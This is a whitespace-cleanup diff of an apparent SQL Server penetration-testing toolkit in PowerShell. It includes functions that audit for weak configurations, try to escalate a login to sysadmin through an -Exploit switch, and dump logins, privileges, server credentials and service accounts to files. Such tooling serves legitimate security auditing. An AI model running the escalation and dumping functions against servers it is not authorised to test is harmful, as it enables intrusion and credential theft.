                     $bindingFlags = [Reflection.BindingFlags]'Default,NonPublic,Instance'
                     $GetWithInputHandlingForInvokeCommandImpl = ($ScriptBlock.ast.gettype().GetMethod('GetWithInputHandlingForInvokeCommandImpl',$bindingFlags))
-        
+
                     $StringScriptBlock = $GetWithInputHandlingForInvokeCommandImpl.Invoke($ScriptBlock.ast,@($Tuple))
 
                     $ScriptBlock = [scriptblock]::Create($StringScriptBlock)
@@ -13293,7 +13317,7 @@ function Invoke-Parallel
                     #Write-Verbose $StringScriptBlock
                 }
             }
-                
+
             $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock("param($($ParamsToAdd -Join ', '))`r`n" + $ScriptBlock.ToString())
         }
         else
@@ -13364,11 +13388,11 @@ function Invoke-Parallel
 
         #Create runspace pool
         $runspacepool = [runspacefactory]::CreateRunspacePool(1, $Throttle, $sessionstate, $Host)
-        $runspacepool.Open() 
+        $runspacepool.Open()
 
         #Write-Verbose "Creating empty collection to hold runspace jobs"
-        $Script:runspaces = New-Object -TypeName System.Collections.ArrayList        
-        
+        $Script:runspaces = New-Object -TypeName System.Collections.ArrayList
+
         #If inputObject is bound get a total count and set bound to true
         $bound = $PSBoundParameters.keys -contains 'InputObject'
         if(-not $bound)
@@ -13383,7 +13407,7 @@ function Invoke-Parallel
                 ("" | Select Date, Action, Runtime, Status, Details | ConvertTo-Csv -NoTypeInformation -Delimiter ";")[0] | Out-File $LogFile
                 }
 
-                #write initial log entry           
+                #write initial log entry
                 $log = "" | Select Date, Action, Runtime, Status, Details
                 $log.Date = Get-Date
                 $log.Action = "Batch processing started"
@@ -13413,7 +13437,7 @@ function Invoke-Parallel
     }
 
     End {
-        
+
         #Use Try/Finally to catch Ctrl+C and clean up.
         Try
         {
@@ -13425,10 +13449,10 @@ function Invoke-Parallel
             foreach($object in $allObjects)
             {
                 #region add scripts to runspace pool
-                    
+
                 #Create the powershell instance, set verbose if needed, supply the scriptblock and parameters
                 $powershell = [powershell]::Create()
-                    
+
                 if ($VerbosePreference -eq 'Continue')
                 {
                     [void]$powershell.AddScript({
@@ -13446,7 +13470,7 @@ function Invoke-Parallel
                 # $Using support from Boe Prox
                 if ($UsingVariableData)
                 {
-                    Foreach($UsingVariable in $UsingVariableData) 
+                    Foreach($UsingVariable in $UsingVariableData)
                     {
                         #Write-Verbose "Adding $($UsingVariable.Name) with value: $($UsingVariable.Value)"
                         [void]$powershell.AddArgument($UsingVariable.Value)
@@ -13455,13 +13479,13 @@ function Invoke-Parallel
 
                 #Add the runspace into the powershell instance
                 $powershell.RunspacePool = $runspacepool
-    
+
                 #Create a temporary collection for each runspace
                 $temp = '' | Select-Object -Property PowerShell, StartTime, object, Runspace
                 $temp.PowerShell = $powershell
                 $temp.StartTime = Get-Date
                 $temp.object = $object
-    
+
                 #Save the handle output when calling BeginInvoke() that will be used later to end the runspace
                 $temp.Runspace = $powershell.BeginInvoke()
                 $startedCount++
@@ -13469,14 +13493,14 @@ function Invoke-Parallel
                 #Add the temp tracking info to $runspaces collection
                 #Write-Verbose ( "Adding {0} to collection at {1}" -f $temp.object, $temp.starttime.tostring() )
                 $null = $runspaces.Add($temp)
-            
+
                 #loop through existing runspaces one time
                 Get-RunspaceData
 
                 #If we have more running than max queue (used to control timeout accuracy)
                 #Script scope resolves odd PowerShell 2 issue
                 $firstRun = $true
-                while ($runspaces.count -ge $script:MaxQueue) 
+                while ($runspaces.count -ge $script:MaxQueue)
                 {
                     #give verbose output
                     if($firstRun)
@@ -13484,7 +13508,7 @@ function Invoke-Parallel
                         #Write-Verbose "$($runspaces.count) items running - exceeded $Script:MaxQueue limit."
                     }
                     $firstRun = $false
-                    
+
                     #run get-runspace data and sleep for a short while
                     Get-RunspaceData
                     Start-Sleep -Milliseconds $SleepTimer
@@ -13492,11 +13516,11 @@ function Invoke-Parallel
 
                 #endregion add scripts to runspace pool
             }
-                     
+
             #Write-Verbose ( "Finish processing the remaining runspace jobs: {0}" -f ( @($runspaces | Where {$_.Runspace -ne $Null}).Count) )
             Get-RunspaceData -wait
 
-            if (-not $Quiet) 
+            if (-not $Quiet)
             {
                 Write-Progress -Activity 'Running Query' -Status 'Starting threads' -Completed
             }
@@ -13504,7 +13528,7 @@ function Invoke-Parallel
         Finally
         {
             #Close the runspace pool, unless we specified no close on timeout and something timed out
-            if ( ($timedOutTasks -eq $false) -or ( ($timedOutTasks -eq $true) -and ($NoCloseOnTimeout -eq $false) ) ) 
+            if ( ($timedOutTasks -eq $false) -or ( ($timedOutTasks -eq $true) -and ($NoCloseOnTimeout -eq $false) ) )
             {
                 Write-Verbose -Message 'Closing the runspace pool'
                 $runspacepool.close()
@@ -13512,7 +13536,7 @@ function Invoke-Parallel
 
             #collect garbage
             [gc]::Collect()
-        }       
+        }
     }
 }
 
@@ -13531,20 +13555,20 @@ function Invoke-Parallel
 # Invoke-SQLAudit
 # ----------------------------------
 # Author: Scott Sutherland
-Function Invoke-SQLAudit 
+Function Invoke-SQLAudit
 {
     <#
             .SYNOPSIS
             Audit for high impact weak configurations by running all privilege escalation checks.
             Note:  Use the Exploit flag to attempt to obtain sysadmin privileges.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER NoOutput
             Don't output anything.
             .PARAMETER Exploit
@@ -13558,7 +13582,7 @@ Function Invoke-SQLAudit
             Instance      : SQLServer1\STANDARDDEV2014
             Vulnerability : PERMISSION - IMPERSONATE LOGIN
             Description   : The current SQL Server login can impersonate other logins.  This may allow an authenticated login to gain additional privileges.
-            Remediation   : Consider using an alterative to impersonation such as signed stored procedures. Impersonation is enabled using a command like: GRANT IMPERSONATE ON 
+            Remediation   : Consider using an alterative to impersonation such as signed stored procedures. Impersonation is enabled using a command like: GRANT IMPERSONATE ON
             Login::sa to [user]. It can be removed using a command like: REVOKE IMPERSONATE ON Login::sa to [user]
             Severity      : High
             IsVulnerable  : Yes
@@ -13576,7 +13600,7 @@ Function Invoke-SQLAudit
             Instance      : SQLServer1\STANDARDDEV2014
             Vulnerability : PERMISSION - IMPERSONATE LOGIN
             Description   : The current SQL Server login can impersonate other logins.  This may allow an authenticated login to gain additional privileges.
-            Remediation   : Consider using an alterative to impersonation such as signed stored procedures. Impersonation is enabled using a command like: GRANT IMPERSONATE ON 
+            Remediation   : Consider using an alterative to impersonation such as signed stored procedures. Impersonation is enabled using a command like: GRANT IMPERSONATE ON
             Login::sa to [user]. It can be removed using a command like: REVOKE IMPERSONATE ON Login::sa to [user]
             Severity      : High
             IsVulnerable  : Yes
@@ -13605,29 +13629,29 @@ Function Invoke-SQLAudit
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
-        [string]$Instance,       
+        [string]$Instance,
 
         [Parameter(Mandatory = $false,
         HelpMessage = "Don't output anything.")]
         [switch]$NoOutput,
-        
+
         [Parameter(Mandatory = $false,
         HelpMessage = 'Exploit vulnerable issues.')]
         [switch]$Exploit,
-       
-       [Parameter(Mandatory = $false,
+
+        [Parameter(Mandatory = $false,
         HelpMessage = 'Folder to write results to csv.')]
-       [string]$OutFolder
+        [string]$OutFolder
     )
 
     Begin
     {
         # Table for output
-        $TblData = New-Object -TypeName System.Data.DataTable 
+        $TblData = New-Object -TypeName System.Data.DataTable
         $null = $TblData.Columns.Add('ComputerName')
         $null = $TblData.Columns.Add('Instance')
         $null = $TblData.Columns.Add('Vulnerability')
@@ -13638,20 +13662,20 @@ Function Invoke-SQLAudit
         $null = $TblData.Columns.Add('IsExploitable')
         $null = $TblData.Columns.Add('Exploited')
         $null = $TblData.Columns.Add('ExploitCmd')
-        $null = $TblData.Columns.Add('Details')    
-        $null = $TblData.Columns.Add('Reference')   
-        $null = $TblData.Columns.Add('Author')       
-        
+        $null = $TblData.Columns.Add('Details')
+        $null = $TblData.Columns.Add('Reference')
+        $null = $TblData.Columns.Add('Author')
+
         # Table for escalation functions
-        $TblVulnFunc = New-Object -TypeName System.Data.DataTable 
+        $TblVulnFunc = New-Object -TypeName System.Data.DataTable
         $null = $TblVulnFunc.Columns.Add('FunctionName')
         $null = $TblVulnFunc.Columns.Add('Type')
-        $TblVulnFunc.Clear()    
+        $TblVulnFunc.Clear()
 
         Write-Verbose -Message 'LOADING VULNERABILITY CHECKS.'
-        
+
         # Load list of vulnerability check functions - Server / database
-        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditWeakLoginPw','Server') 
+        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditWeakLoginPw','Server')
         $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditPrivImpersonateLogin','Server')
         $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditPrivServerLink','Server')
         $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditPrivTrustworthy','Database')
@@ -13660,14 +13684,14 @@ Function Invoke-SQLAudit
         $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditPrivXpDirtree','Database')
         $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditPrivXpFileexist','Database')
         $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditRoleDbDdlAdmin','Database')
-        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditRoleDbOwner','Database')                
-        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditSampleDataByColumn','Database')               
+        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditRoleDbOwner','Database')
+        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditSampleDataByColumn','Database')
 
         Write-Verbose -Message 'RUNNING VULNERABILITY CHECKS.'
     }
 
     Process
-    {              
+    {
         # Test connection to server
         $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
             $_.Status -eq 'Accessible'
@@ -13684,10 +13708,10 @@ Function Invoke-SQLAudit
         }
 
         # Status user
-        Write-Verbose -Message "$Instance : RUNNING VULNERABILITY CHECKS..."        
+        Write-Verbose -Message "$Instance : RUNNING VULNERABILITY CHECKS..."
 
         # Iterate through each function
-        $TblVulnFunc | 
+        $TblVulnFunc |
         ForEach-Object -Process {
             # Get function name
             $FunctionName = $_.FunctionName
@@ -13709,7 +13733,7 @@ Function Invoke-SQLAudit
         # Status user
         Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK."
     }
-        
+
     End
     {
         # Status user
@@ -13723,24 +13747,26 @@ Function Invoke-SQLAudit
             if($CheckAccess -like '*denied.')
             {
                 Write-Verbose -Object 'Access denied to output directory.'
-                Return  
-            }else{
+                Return
+            }
+            else
+            {
                 Write-Verbose -Message 'Verified write access to output directory.'
                 $RemoveCmd = "del $OutFolder\test.txt"
                 Invoke-Expression -Command $RemoveCmd
-                $OutPutInstance = $Instance.Replace('\','-').Replace(',','-')                
+                $OutPutInstance = $Instance.Replace('\','-').Replace(',','-')
                 $OutPutPath = "$OutFolder\"+'PowerUpSQL_Audit_Results_'+$OutPutInstance+'.csv'
                 $OutPutInstance
                 $OutPutPath
-                $TblData  | Export-Csv -NoTypeInformation $OutPutPath 
+                $TblData  | Export-Csv -NoTypeInformation $OutPutPath
             }
-        } 
+        }
 
         # Return full results table
         if ( -not $NoOutput)
-        {             
-            Return $TblData            
-        }            
+        {
+            Return $TblData
+        }
     }
 }
 
@@ -13749,19 +13775,19 @@ Function Invoke-SQLAudit
 # Invoke-SQLEscalatePriv
 # ----------------------------------
 # Author: Scott Sutherland
-Function Invoke-SQLEscalatePriv 
+Function Invoke-SQLEscalatePriv
 {
     <#
             .SYNOPSIS
             This function can be used to attempt to obtain sysadmin privileges via identify vulnerabilities.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .EXAMPLE
             PS C:\> Invoke-SQLEscalatePriv -Instance SQLServer1\STANDARDDEV2014 -Username evil -Password Password123!
     #>
@@ -13779,9 +13805,9 @@ Function Invoke-SQLEscalatePriv
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance
     )
@@ -13791,7 +13817,7 @@ Function Invoke-SQLEscalatePriv
     }
 
     Process
-    {              
+    {
         # Test connection to server
         $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
             $_.Status -eq 'Accessible'
@@ -13808,8 +13834,8 @@ Function Invoke-SQLEscalatePriv
         }
 
         # Check for sysadmin
-        Write-Verbose -Message "$Instance : Checking if you're already a sysadmin..."        
-        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin               
+        Write-Verbose -Message "$Instance : Checking if you're already a sysadmin..."
+        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
         if($IsSysadmin -eq 'Yes')
         {
             Write-Verbose -Message "$Instance : You are, so nothing to do here. :)"
@@ -13818,9 +13844,9 @@ Function Invoke-SQLEscalatePriv
         {
             Write-Verbose -Message "$Instance : You're not a sysadmin, attempting to change that..."
             Invoke-SQLAudit -Instance $Instance -Username $Username -Password $Password -Credential $Credential -NoOutput -Exploit
-            
+
             # Check for sysadmin again
-            $IsSysadmin2 = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin                           
+            $IsSysadmin2 = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
             if($IsSysadmin2 -eq 'Yes')
             {
                 Write-Verbose -Message "$Instance : Success! You are now a sysadmin!"
@@ -13828,12 +13854,12 @@ Function Invoke-SQLEscalatePriv
             else
             {
                 Write-Verbose -Message "$Instance : Fail. We couldn't get you sysadmin access today."
-            }            
+            }
         }
     }
-        
+
     End
-    { 
+    {
     }
 }
 
@@ -13847,17 +13873,17 @@ Function Invoke-SQLDumpInfo
             .SYNOPSIS
             This function can be used to attempt to obtain sysadmin privileges via identify vulnerabilities.  It supports both csv and xml output.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER XML
-            Generate xml output instead of csv. 
+            Generate xml output instead of csv.
             .PARAMETER OutFolder
-            Output to a specific path instead of the current directory. 
+            Output to a specific path instead of the current directory.
             .EXAMPLE
             PS C:\> Get-SQLInstanceLocal | Invoke-SQLDumpInfo -Verbose
             .EXAMPLE
@@ -13877,9 +13903,9 @@ Function Invoke-SQLDumpInfo
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
@@ -13906,7 +13932,7 @@ Function Invoke-SQLDumpInfo
         else
         {
             $OutFolder = '.'
-            $OutFolderCmd = "echo test > $OutFolder\test.txt"             
+            $OutFolderCmd = "echo test > $OutFolder\test.txt"
         }
 
         # Create output folder
@@ -13914,18 +13940,18 @@ Function Invoke-SQLDumpInfo
         if($CheckAccess -like '*denied.')
         {
             Write-Host -Object 'Access denied to output directory.'
-            Return  
+            Return
         }
         else
         {
             Write-Verbose -Message 'Verified write access to output directory.'
             $RemoveCmd = "del $OutFolder\test.txt"
             Invoke-Expression -Command $RemoveCmd
-        }  
+        }
     }
 
     Process
-    {              
+    {
         # Test connection to server
         $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
             $_.Status -eq 'Accessible'
@@ -13939,310 +13965,310 @@ Function Invoke-SQLDumpInfo
         if(-not $Instance)
         {
             $Instance = $env:COMPUTERNAME
-        }       
-        
+        }
+
         Write-Verbose -Message "$Instance - START..."
         $OutPutInstance = $Instance.Replace('\','-').Replace(',','-')
-                
+
         # Getting Databases
         Write-Verbose -Message "$Instance - Getting non-default databases..."
         $Results = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
         if($xml)
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Databases.xml'
-            $Results | Export-Clixml $OutPutPath 
+            $Results | Export-Clixml $OutPutPath
         }
         else
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Databases.csv'
-            $Results | Export-Csv -NoTypeInformation $OutPutPath 
+            $Results | Export-Csv -NoTypeInformation $OutPutPath
         }
-             
+
         # Getting DatabaseUsers
-        Write-Verbose -Message "$Instance - Getting database users for databases..."        
-        $Results = Get-SQLDatabaseUser -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults        
+        Write-Verbose -Message "$Instance - Getting database users for databases..."
+        $Results = Get-SQLDatabaseUser -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
         if($xml)
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_Users.xml'
-            $Results | Export-Clixml $OutPutPath 
+            $Results | Export-Clixml $OutPutPath
         }
         else
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_Users.csv'
-            $Results | Export-Csv -NoTypeInformation $OutPutPath 
+            $Results | Export-Csv -NoTypeInformation $OutPutPath
         }
-                               
+
         # Getting DatabasePrivs
         Write-Verbose -Message "$Instance - Getting privileges for databases..."
-        $Results = Get-SQLDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults        
+        $Results = Get-SQLDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
         if($xml)
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_privileges.xml'
-            $Results | Export-Clixml $OutPutPath 
+            $Results | Export-Clixml $OutPutPath
         }
         else
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_privileges.csv'
-            $Results | Export-Csv -NoTypeInformation $OutPutPath 
+            $Results | Export-Csv -NoTypeInformation $OutPutPath
         }
-        
+
         # Getting DatabaseRoles
         Write-Verbose -Message "$Instance - Getting database roles..."
-        $Results = Get-SQLDatabaseRole -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults        
+        $Results = Get-SQLDatabaseRole -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
         if($xml)
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_roles.xml'
-            $Results | Export-Clixml $OutPutPath 
+            $Results | Export-Clixml $OutPutPath
         }
         else
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_roles.csv'
-            $Results | Export-Csv -NoTypeInformation $OutPutPath 
+            $Results | Export-Csv -NoTypeInformation $OutPutPath
         }
-        
+
         # Getting DatabaseRoleMembers
         Write-Verbose -Message "$Instance - Getting database role members..."
         $Results = Get-SQLDatabaseRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
         if($xml)
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_role_members.xml'
-            $Results | Export-Clixml $OutPutPath 
+            $Results | Export-Clixml $OutPutPath
         }
         else
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_role_members.csv'
-            $Results | Export-Csv -NoTypeInformation $OutPutPath 
+            $Results | Export-Csv -NoTypeInformation $OutPutPath
         }
 
         # Getting DatabaseTables
         Write-Verbose -Message "$Instance - Getting database schemas..."
-        $Results = Get-SQLDatabaseSchema -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults        
+        $Results = Get-SQLDatabaseSchema -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
         if($xml)
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_schemas.xml'
-            $Results | Export-Clixml $OutPutPath 
+            $Results | Export-Clixml $OutPutPath
         }
         else
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_schemas.csv'
-            $Results | Export-Csv -NoTypeInformation $OutPutPath 
-        }        
+            $Results | Export-Csv -NoTypeInformation $OutPutPath
+        }
 
         # Getting DatabaseTables
         Write-Verbose -Message "$Instance - Getting database tables..."
-        $Results = Get-SQLTable -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults        
+        $Results = Get-SQLTable -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
         if($xml)
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_tables.xml'
-            $Results | Export-Clixml $OutPutPath 
+            $Results | Export-Clixml $OutPutPath
         }
         else
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_tables.csv'
-            $Results | Export-Csv -NoTypeInformation $OutPutPath 
+            $Results | Export-Csv -NoTypeInformation $OutPutPath
         }
-        
+
         # Getting DatabaseViews
         Write-Verbose -Message "$Instance - Getting database views..."
-        $Results = Get-SQLView -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults        
+        $Results = Get-SQLView -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
         if($xml)
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_views.xml'
-            $Results | Export-Clixml $OutPutPath 
+            $Results | Export-Clixml $OutPutPath
         }
         else
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_views.csv'
-            $Results | Export-Csv -NoTypeInformation $OutPutPath 
+            $Results | Export-Csv -NoTypeInformation $OutPutPath
         }
 
         # Getting Database Tables
         Write-Verbose -Message "$Instance - Getting database columns..."
-        $Results = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults        
+        $Results = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
         if($xml)
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_columns.xml'
-            $Results | Export-Clixml $OutPutPath 
+            $Results | Export-Clixml $OutPutPath
         }
         else
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_columns.csv'
-            $Results | Export-Csv -NoTypeInformation $OutPutPath 
+            $Results | Export-Csv -NoTypeInformation $OutPutPath
         }
-        
+
         # Getting Server Logins
         Write-Verbose -Message "$Instance - Getting server logins..."
-        $Results = Get-SQLServerLogin -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose        
+        $Results = Get-SQLServerLogin -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
         if($xml)
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_logins.xml'
-            $Results | Export-Clixml $OutPutPath 
+            $Results | Export-Clixml $OutPutPath
         }
         else
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_logins.csv'
-            $Results | Export-Csv -NoTypeInformation $OutPutPath 
-        }   
-        
+            $Results | Export-Csv -NoTypeInformation $OutPutPath
+        }
+
         # Getting Server Logins
         Write-Verbose -Message "$Instance - Getting server configuration settings..."
-        $Results = Get-SQLServerConfiguration -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose        
+        $Results = Get-SQLServerConfiguration -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
         if($xml)
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_Configuration.xml'
-            $Results | Export-Clixml $OutPutPath 
+            $Results | Export-Clixml $OutPutPath
         }
         else
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_Configuration.csv'
-            $Results | Export-Csv -NoTypeInformation $OutPutPath 
-        }                   
-        
+            $Results | Export-Csv -NoTypeInformation $OutPutPath
+        }
+
         # Getting Server Privs
         Write-Verbose -Message "$Instance - Getting server privileges..."
-        $Results = Get-SQLServerPriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose         
+        $Results = Get-SQLServerPriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
         if($xml)
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_privileges.xml'
-            $Results | Export-Clixml $OutPutPath 
+            $Results | Export-Clixml $OutPutPath
         }
         else
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_privileges.csv'
-            $Results | Export-Csv -NoTypeInformation $OutPutPath 
-        }    
-        
+            $Results | Export-Csv -NoTypeInformation $OutPutPath
+        }
+
         # Getting Server Roles
         Write-Verbose -Message "$Instance - Getting server roles..."
-        $Results = Get-SQLServerRole -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose         
+        $Results = Get-SQLServerRole -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
         if($xml)
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_roles.xml'
-            $Results | Export-Clixml $OutPutPath 
+            $Results | Export-Clixml $OutPutPath
         }
         else
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_roles.csv'
-            $Results | Export-Csv -NoTypeInformation $OutPutPath 
-        }    
-        
+            $Results | Export-Csv -NoTypeInformation $OutPutPath
+        }
+
         # Getting Server Role Members
         Write-Verbose -Message "$Instance - Getting server role members..."
-        $Results = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose         
+        $Results = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
         if($xml)
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_rolemembers.xml'
-            $Results | Export-Clixml $OutPutPath 
+            $Results | Export-Clixml $OutPutPath
         }
         else
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_rolemembers.csv'
-            $Results | Export-Csv -NoTypeInformation $OutPutPath 
-        }    
-        
+            $Results | Export-Csv -NoTypeInformation $OutPutPath
+        }
+
         # Getting Server Links
         Write-Verbose -Message "$Instance - Getting server links..."
-        $Results = Get-SQLServerLink -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose         
+        $Results = Get-SQLServerLink -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
         if($xml)
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_links.xml'
-            $Results | Export-Clixml $OutPutPath 
+            $Results | Export-Clixml $OutPutPath
         }
         else
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_links.csv'
-            $Results | Export-Csv -NoTypeInformation $OutPutPath 
-        }    
-        
+            $Results | Export-Csv -NoTypeInformation $OutPutPath
+        }
+
         # Getting Server Credentials
         Write-Verbose -Message "$Instance - Getting server credentials..."
-        $Results = Get-SQLServerCredential -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose         
+        $Results = Get-SQLServerCredential -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
         if($xml)
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_credentials.xml'
-            $Results | Export-Clixml $OutPutPath 
+            $Results | Export-Clixml $OutPutPath
         }
         else
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_credentials.csv'
-            $Results | Export-Csv -NoTypeInformation $OutPutPath 
-        }    
-        
+            $Results | Export-Csv -NoTypeInformation $OutPutPath
+        }
+
         # Getting Service Accounts
         Write-Verbose -Message "$Instance - Getting SQL Server service accounts..."
-        $Results = Get-SQLServiceAccount -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose        
+        $Results = Get-SQLServiceAccount -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
         if($xml)
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Service_accounts.xml'
-            $Results | Export-Clixml $OutPutPath 
+            $Results | Export-Clixml $OutPutPath
         }
         else
         {
             $OutPutPath = "$OutFolder\$OutPutInstance"+'_Service_accounts.csv'
-            $Results | Export-Csv -NoTypeInformation $OutPutPath 
-        }    
-        
